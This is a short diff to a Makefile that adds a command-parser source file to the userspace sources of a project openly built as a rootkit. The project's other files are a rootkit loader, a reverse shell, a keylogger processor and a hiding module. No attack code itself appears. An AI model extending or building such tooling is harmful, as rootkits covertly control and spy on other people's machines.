@@ -13,7 +13,8 @@ USER_SRCS := \
 	src/userspace/rootkit_loader.c \
 	src/userspace/reverse_shell.c \
 	src/userspace/keylogger_processor.c \
-	src/userspace/hider.c
+	src/userspace/hider.c \
+	src/userspace/command_parser.c
 
 USER_BIN := $(BUILD_DIR)/rootkit
 
